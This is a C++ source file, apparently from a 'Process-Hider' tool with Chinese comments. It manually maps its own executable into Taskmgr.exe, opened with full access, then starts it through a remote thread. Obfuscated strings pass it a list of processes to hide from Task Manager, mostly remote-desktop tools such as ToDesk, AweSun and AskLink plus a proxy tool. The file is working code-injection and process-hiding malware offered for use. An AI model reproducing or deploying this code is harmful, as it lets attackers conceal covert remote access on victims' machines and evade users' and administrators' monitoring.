#include "external.hpp"

/**
 * @file external.cpp
 * @brief Implements external DLL injection into a target process (`Taskmgr.exe`), including manual mapping
 *        of the current executable image and communication parameters into remote memory.
 *
 * This file provides functions to perform external injection of the current module into a remote process
 * by manually mapping its PE image and configuration data. It avoids using standard `LoadLibrary` techniques,
 * and instead replicates parts of the PE loader behavior to place the executable into a target process's memory
 * and invoke its entry point via a remote thread.
 *
 * Key Features:
 * - `inject`: Entry point that opens the target process, maps the current module, and creates a remote thread to execute it.
 * - `unload`: Frees the remote memory allocations (image and parameters) and closes the process handle.
 * - `map_file`: Parses and maps a PE image (headers and sections) into a remote process.
 * - `map_param`: Allocates and writes configuration parameters (e.g., process names to hide) into remote memory.
 * - `get_process_pid_by_name`: Retrieves the PID of a running process by name using a snapshot of the system.
 * - `get_file_bytes`: Loads the raw bytes of the current module into memory for manual mapping.
 */

auto ph::external::inject( ) -> void
{
	/// Open the target process (Taskmgr.exe)

	ph::external::process_handle = sdk::win::open_process(
		PROCESS_ALL_ACCESS, false, ph::external::get_process_pid_by_name( xorstr( "Taskmgr.exe" ) ) );

	/// Retrieve the path to the current executable file

	auto file_path = sdk::string( MAX_PATH );
	sdk::win::get_module_file_name( 0, file_path, MAX_PATH );

	/// Read all bytes from the current file into memory

	auto file_bytes = ph::external::get_file_bytes( file_path );

	/// Map the current file and parameters into the remote process

	ph::external::file_base_address = ph::external::map_file( file_bytes );
	ph::external::param_base_address = ph::external::map_param( );

	auto nt_header = ( PIMAGE_NT_HEADERS )
		( ( unsigned __int64 ) file_bytes + ( ( PIMAGE_DOS_HEADER ) file_bytes )->e_lfanew );

	/// Create a remote thread at the entry point of the mapped image

	sdk::win::close_handle(
		sdk::win::create_remote_thread(
		process_handle, nullptr, 0, ( void* ) ( ( unsigned __int64 ) file_base_address + nt_header->OptionalHeader.AddressOfEntryPoint ), param_base_address, 0, nullptr ) );

	sdk::handler::free( file_bytes );
}

auto ph::external::unload( ) -> void
{
	sdk::win::nt_free_virtual_memory(
		process_handle, &ph::external::file_base_address, nullptr, MEM_RELEASE );

	sdk::win::nt_free_virtual_memory(
		process_handle, &ph::external::param_base_address, nullptr, MEM_RELEASE );

	sdk::win::close_handle( process_handle );
}

auto ph::external::map_file( unsigned char* file_bytes ) -> void*
{
	/// Parse DOS and NT headers from the file

	auto dos_header = ( PIMAGE_DOS_HEADER ) file_bytes;
	auto nt_header = ( PIMAGE_NT_HEADERS ) ( ( unsigned __int64 ) file_bytes + dos_header->e_lfanew );

	auto base_address = ( void* ) nullptr;
	auto size = ( unsigned __int64 ) nt_header->OptionalHeader.SizeOfImage;

	/// Allocate memory in the target process for the entire image

	sdk::win::nt_allocate_virtual_memory(
		process_handle, &base_address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	// Write the PE headers on the target process

	sdk::win::nt_write_virtual_memory(
		process_handle, base_address, file_bytes, nt_header->OptionalHeader.SizeOfHeaders, nullptr );

	/// Write sections on the target process

	auto base_address_ = ( unsigned __int64 ) base_address;
	auto section = ( IMAGE_SECTION_HEADER* ) ( ( unsigned __int64 ) nt_header + sizeof( IMAGE_NT_HEADERS ) );

	for ( auto i = 0; i < nt_header->FileHeader.NumberOfSections; ++i )
	{
		sdk::win::nt_write_virtual_memory(
			process_handle, ( void* ) ( base_address_ + section->VirtualAddress ), file_bytes + section->PointerToRawData, section->SizeOfRawData, nullptr );

		section++;
	}

	return base_address;
}

auto ph::external::map_param( ) -> void*
{
    auto param = ( sdk::loader* ) sdk::handler::allocate( sizeof( sdk::loader ) );

    param->__is_valid_flag = 0xDEAD;
    param->process_count = 11;  // 保持和下面列表数量一致

    // ===== 修复：使用持久存储的字符串 =====
    // 定义一个本地字符串数组，确保生命周期覆盖整个函数
    const wchar_t* local_process_names[] = {
        L"Process-Hider.exe",
        L"SEWanClt.exe",
        L"SEBarClt.exe",
        L"AweSun.exe",
        L"AskLink.exe",
        L"AskLinkSession.exe",
        L"GameViewer.exe",
        L"GameViewerServer.exe",
        L"ToDesk.exe",
        L"Td.exe",
        L"SSTap.exe"
    };

    // 1. 先为每个字符串分配内存（在远程进程中）
    wchar_t** remote_strings = ( wchar_t** ) sdk::handler::allocate( sizeof( wchar_t* ) * param->process_count );

    for ( auto i = 0; i < param->process_count; ++i )
    {
        // 计算字符串长度（包括终止符）
        size_t length = wcslen( local_process_names[i] ) + 1;
        size_t name_size = length * sizeof( wchar_t );

        // 在远程进程分配内存
        void* remote_string = nullptr;
        sdk::win::nt_allocate_virtual_memory(
            process_handle, &remote_string, 0, &name_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

        // 写入字符串数据（包括终止符）
        sdk::win::nt_write_virtual_memory(
            process_handle, remote_string, local_process_names[i], name_size, nullptr );

        // 存储远程指针
        remote_strings[i] = ( wchar_t* ) remote_string;
    }

    // 2. 在远程进程分配字符串指针数组
    auto remote_process_list = ( void* ) nullptr;
    auto list_size = ( unsigned __int64 ) sizeof( wchar_t* ) * param->process_count;

    sdk::win::nt_allocate_virtual_memory(
        process_handle, &remote_process_list, 0, &list_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    sdk::win::nt_write_virtual_memory(
        process_handle, remote_process_list, remote_strings, list_size, nullptr );

    param->processes = ( wchar_t** ) remote_process_list;

    // 3. 分配 param 结构体到远程进程
    auto param_address = ( void* ) nullptr;
    auto param_size = ( unsigned __int64 ) sizeof( sdk::loader );

    sdk::win::nt_allocate_virtual_memory(
        process_handle, &param_address, 0, &param_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    sdk::win::nt_write_virtual_memory(
        process_handle, param_address, param, sizeof( sdk::loader ), nullptr );

    // 清理本地内存
    sdk::handler::free( remote_strings );
    sdk::handler::free( param );

    return param_address;
}

auto ph::external::get_process_pid_by_name( const sdk::string& process_name ) -> __int32
{
	sdk::win::get_procedure_address( sdk::win::get_module_base( xorstr( L"kernel32.dll" ) ), xorstr( "CreateToolhelp32Snapshot" ) );

	auto snapshot = sdk::win::create_toolhelp_snapshot( TH32CS_SNAPPROCESS, 0 );

	if ( snapshot == INVALID_HANDLE_VALUE )
		return 0;

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof( PROCESSENTRY32 );

	for ( auto next = sdk::win::process32_first( snapshot, &process_entry ); next; next = sdk::win::process32_next( snapshot, &process_entry ) )
		if ( process_name == sdk::string( process_entry.szExeFile ) )
		{
			sdk::win::close_handle( snapshot );
			return process_entry.th32ProcessID;
		}

	sdk::win::close_handle( snapshot );
	return 0;
}

auto ph::external::get_file_bytes( const sdk::string& file_path ) -> unsigned char*
{
	auto file = sdk::win::create_file( file_path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr );

	auto dll_size = sdk::win::get_file_size( file, nullptr );
	auto buffer = ( unsigned char* ) sdk::handler::allocate( dll_size );

	unsigned __int32 bytes;
	sdk::win::read_file( file, buffer, dll_size, &bytes, nullptr );
	sdk::win::close_handle( file );

	return buffer;
}
